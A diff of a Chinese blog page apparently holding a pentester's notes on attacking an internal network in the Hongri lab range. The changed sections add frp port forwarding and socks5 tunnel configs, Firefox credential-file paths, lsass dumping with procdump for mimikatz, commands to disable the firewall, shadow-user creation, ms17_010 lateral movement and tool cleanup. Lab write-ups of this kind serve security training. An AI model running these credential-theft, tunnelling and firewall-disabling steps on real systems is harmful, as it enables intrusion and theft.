@@ -18,7 +18,7 @@
 <meta property="og:description" content="这次用红日的靶场学了一下怎么打内网，写个笔记">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-06-07T03:02:07.000Z">
-<meta property="article:modified_time" content="2021-06-08T13:22:11.331Z">
+<meta property="article:modified_time" content="2021-08-13T06:27:48.781Z">
 <meta property="article:author" content="Sn1pEr">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
@@ -241,7 +241,7 @@ var _hmt = _hmt || [];
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1k字</span>
+      <span class="post-count">1.2k字</span>
     </span>
   </span>
 
@@ -282,18 +282,22 @@ var _hmt = _hmt || [];
 <p>监听器选刚刚创建的监听器，output选什么按情况来，一般来说选powershell command，其他语言是在给了exp要你替换shellcode的时候用的</p>
 <p>或者选attacks -&gt; packages -&gt; windows executable生成exe文件，直接上传上去执行。</p>
 <p>3.复制payload，然后命令执行就好了。（有时候可能因为没有powershell或者有杀软给拦住了，免杀不会）</p>
-<h2 id="搜集主机信息"><a href="#搜集主机信息" class="headerlink" title="搜集主机信息"></a>搜集主机信息</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net time /domain #查看时间（判断主域）</span><br><span class="line">net user /domain #查看域用户</span><br><span class="line">net group #查看工作组</span><br><span class="line">net view /domain #查看域列表</span><br><span class="line">systeminfo #系统信息</span><br><span class="line">tasklist #进程列表</span><br><span class="line">ipconfig /all #查看网卡信息，判断内网网段，查询域控IP</span><br><span class="line"><span class="meta">%</span><span class="bash">appdata%\Mozilla\Firefox\Profiles\*.defualt\logins.json</span></span><br><span class="line"><span class="meta">%</span><span class="bash">appdata%\Mozilla\Firefox\Profiles\*.defualt\key3.db</span></span><br><span class="line"><span class="meta">%</span><span class="bash">appdata%\Mozilla\Firefox\Profiles\*.defualt\place.sqlite  <span class="comment">#火狐浏览器密码、历史记录</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="搜集主机信息"><a href="#搜集主机信息" class="headerlink" title="搜集主机信息"></a>搜集主机信息</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">net time /domain #查看时间（判断主域）</span><br><span class="line">net user /domain #查看域用户</span><br><span class="line">net group #查看工作组</span><br><span class="line">net view /domain #查看域列表</span><br><span class="line">systeminfo #系统信息</span><br><span class="line">tasklist #进程列表</span><br><span class="line">ipconfig /all #查看网卡信息，判断内网网段，查询域控IP</span><br><span class="line"><span class="meta">%</span><span class="bash">appdata%\Mozilla\Firefox\Profiles\*.defualt\logins.json</span></span><br><span class="line"><span class="meta">%</span><span class="bash">appdata%\Mozilla\Firefox\Profiles\*.defualt\key3.db</span></span><br><span class="line"><span class="meta">%</span><span class="bash">appdata%\Mozilla\Firefox\Profiles\*.defualt\place.sqlite  <span class="comment">#火狐浏览器密码、历史记录</span></span></span><br><span class="line">arp -a  #看网段</span><br><span class="line">route  #看路由</span><br></pre></td></tr></table></figure>
 <p>常见杀软进程：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">360sd.exe	360杀毒</span><br><span class="line">360tray.exe	360实时保护</span><br><span class="line">ZhuDongFangYu.exe	360主动防御</span><br><span class="line">KSafeTray.exe	金山卫士</span><br><span class="line">SafeDogUpdateCenter.exe	安全狗</span><br><span class="line">McAfee McShield.exe	McAfee</span><br><span class="line">egui.exe	NOD32</span><br><span class="line">AVP.exe	卡巴斯基</span><br><span class="line">avguard.exe	小红伞</span><br><span class="line">bdagent.exe	BitDefender</span><br></pre></td></tr></table></figure>
 <p>mimikatz和hashdump读取本机上保存的密码哈希。</p>
-<p>无法上传mimikatz工具到目标服务器时，可以利用procdump把lsass进程的内存文件导出本地，再在本地利用mimikatz读取密码<code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code>导出为lsass.dump文件</p>
+<p>无法上传mimikatz工具到目标服务器时，可以利用procdump把lsass进程的内存文件导出本地，再在本地利用mimikatz读取密码<code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code>导出为lsass.dump文件    </p>
 <h2 id="添加影子用户"><a href="#添加影子用户" class="headerlink" title="添加影子用户"></a>添加影子用户</h2><p>关闭防火墙：<code>net stop mpssvc</code>，<code>netsh advfirewall set allprofiles state off</code>（生产环境不推荐这么干）</p>
 <p>一般来说是添加影子用户，推荐一个小工具<a target="_blank" rel="noopener" href="https://github.com/An0nySec/ShadowUser/tree/main/ShadowUser/bin/Release">ShadowUser</a></p>
 <p>然后开3389就可以登录了</p>
 <h2 id="维持权限"><a href="#维持权限" class="headerlink" title="维持权限"></a>维持权限</h2><p>设置定时任务，dll劫持等</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/229209.html">权限维持及后门持久化技巧总结 - FreeBuf网络安全行业门户</a></p>
-<h2 id="搭建代理"><a href="#搭建代理" class="headerlink" title="搭建代理"></a>搭建代理</h2><p>我习惯用<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">earthworm</a>，<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">frp</a>也可以。</p>
-<h3 id="ew使用方法"><a href="#ew使用方法" class="headerlink" title="ew使用方法"></a>ew使用方法</h3><ol>
+<h2 id="frp端口转发"><a href="#frp端口转发" class="headerlink" title="frp端口转发"></a>frp端口转发</h2><p>下载解压之后，将frps放在公网VPS上，修改frps.ini，运行<code>./frps -c ./frps.ini</code>。</p>
+<p>将frpc放在内网主机上，修改frpc.ini</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x #服务器地址</span><br><span class="line">server_port &#x3D; 7000 #服务器监听端口，和frps.ini一致</span><br><span class="line"></span><br><span class="line">[ssh] #服务器名，随便填，下面的参数一致</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; y.y.y.y</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000 #当访问frp服务端x.x.x.x的6000端口时，等于访问客户端y.y.y.y的22端口</span><br></pre></td></tr></table></figure>
+<p>运行<code>./frpc -c ./frpc.ini</code></p>
+<h2 id="搭建代理"><a href="#搭建代理" class="headerlink" title="搭建代理"></a>搭建代理</h2><p>我习惯用<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">earthworm</a>，<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">frp</a>也可以。利用<code>nohup 命令 &amp;</code>可以让他挂在后台运行，要退出则需要用ps -elf查看pid然后用kill命令</p>
+<h3 id="ew代理"><a href="#ew代理" class="headerlink" title="ew代理"></a>ew代理</h3><ol>
 <li><p>正向代理</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a)./ew -s ssocksd -l 8888 # 在 1.1.1.1 主机上通过这个命令开启 8888 端口的 socks 代理</span><br></pre></td></tr></table></figure></li>
 <li><p>反向代理</p>
@@ -303,10 +307,12 @@ var _hmt = _hmt || [];
 </ol>
 <p><code>vim /etc/proxychains.conf</code></p>
 <p>去掉dynamic_chain的注释，在最后一行添加<code>socks5 1.1.1.1 1080</code></p>
-<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><p>下载解压之后，将frps放在公网VPS上，修改frps.ini，运行<code>./frps -c ./frps.ini</code>。</p>
-<p>将frpc放在内网主机上，修改frpc.ini</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x #服务器地址</span><br><span class="line">server_port &#x3D; 7000 #服务器监听端口，和frps.ini一致</span><br><span class="line"></span><br><span class="line">[ssh] #服务器名，随便填，下面的参数一致</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000 #当访问frp服务端x.x.x.x的7777端口时，等于访问客户端127.0.0.1的6666端口</span><br></pre></td></tr></table></figure>
-<p>运行<code>./frpc -c ./frpc.ini</code></p>
+<h3 id="frp代理"><a href="#frp代理" class="headerlink" title="frp代理"></a>frp代理</h3><p>和frp转发差不多，就是把东西放上去然后运行就行了，主要看配置</p>
+<p>frps.ini</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 9009</span><br><span class="line">token &#x3D; thisismyfucktoken</span><br><span class="line">tls_enable &#x3D; true</span><br></pre></td></tr></table></figure>
+<p>frpc.ini</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 9009</span><br><span class="line">token &#x3D; thisismyfucktoken</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 9000</span><br><span class="line">plugin &#x3D; socks5 #开启socks5插件</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br><span class="line">tls_enable &#x3D; true #开启tls加密</span><br><span class="line">dns_server &#x3D; 8.8.8.8 #可不填</span><br></pre></td></tr></table></figure>
+<p>socks5连接选择 x.x.x.x:9000</p>
 <h2 id="搜集内网信息"><a href="#搜集内网信息" class="headerlink" title="搜集内网信息"></a>搜集内网信息</h2><p><a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">fscan</a>一键搜集</p>
 <p>cs中也有进行主机发现的方法。</p>
 <p>一般来说都是用<code>arp -a</code>发现网段，然后<code>for /L %I in (1,1,254) DO @ping -2 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</code>来发现主机或用<code>proxychains nmap</code>来进行扫描，也可以用<code>proxychains msfconsole</code>来收集端口或扫描漏洞。nmap和msf中都有漏洞扫描模块。</p>
@@ -314,6 +320,7 @@ var _hmt = _hmt || [];
 <p>smb登录（新建一个smb listener，选中beacon，右键access-&gt;spawn as，选一个跑出来的密码，选smb listener就有了）</p>
 <p>直接用跑出来的账号密码登录</p>
 <p>用ms17_010直接打</p>
+<h3 id="结束时木马等文件的清理"><a href="#结束时木马等文件的清理" class="headerlink" title="结束时木马等文件的清理"></a>结束时木马等文件的清理</h3><p>ew、frp、mimikatz需要<code>taskkill /f /t /im xxx.exe</code>（windows）或<code>killall xxx.exe</code>（linux）之后再删除</p>
 
     
 
@@ -432,6 +439,15 @@ var _hmt = _hmt || [];
 
 <nav id="article-nav">
   
+    <a href="/2021/06/10/mysql%E6%8F%90%E6%9D%83/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          mysql提权
+        
+      </div>
+    </a>
+  
   
     <a href="/2021/04/12/nmap%E5%8F%82%E6%95%B0/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">nmap参数</div>
@@ -461,7 +477,7 @@ var _hmt = _hmt || [];
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E4%B8%8B%E5%A4%96%E7%BD%91%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">拿下外网主机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.1.</span> <span class="toc-text">cs上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E9%9B%86%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">搜集主机信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7"><span class="toc-number">3.</span> <span class="toc-text">添加影子用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90"><span class="toc-number">4.</span> <span class="toc-text">维持权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text">搭建代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ew%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">5.1.</span> <span class="toc-text">ew使用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#frp"><span class="toc-number">5.2.</span> <span class="toc-text">frp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E9%9B%86%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF"><span class="toc-number">6.</span> <span class="toc-text">搜集内网信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.</span> <span class="toc-text">横向移动</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E4%B8%8B%E5%A4%96%E7%BD%91%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">拿下外网主机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.1.</span> <span class="toc-text">cs上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E9%9B%86%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">搜集主机信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7"><span class="toc-number">3.</span> <span class="toc-text">添加影子用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90"><span class="toc-number">4.</span> <span class="toc-text">维持权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#frp%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">5.</span> <span class="toc-text">frp端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86"><span class="toc-number">6.</span> <span class="toc-text">搭建代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ew%E4%BB%A3%E7%90%86"><span class="toc-number">6.1.</span> <span class="toc-text">ew代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#frp%E4%BB%A3%E7%90%86"><span class="toc-number">6.2.</span> <span class="toc-text">frp代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E9%9B%86%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF"><span class="toc-number">7.</span> <span class="toc-text">搜集内网信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">8.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F%E6%97%B6%E6%9C%A8%E9%A9%AC%E7%AD%89%E6%96%87%E4%BB%B6%E7%9A%84%E6%B8%85%E7%90%86"><span class="toc-number">8.1.</span> <span class="toc-text">结束时木马等文件的清理</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -666,6 +682,10 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">nmap</a>
               </li>
              
@@ -682,15 +702,15 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">靶机</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">内网</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
               </li>
              
               <li class="article-tag-list-item">
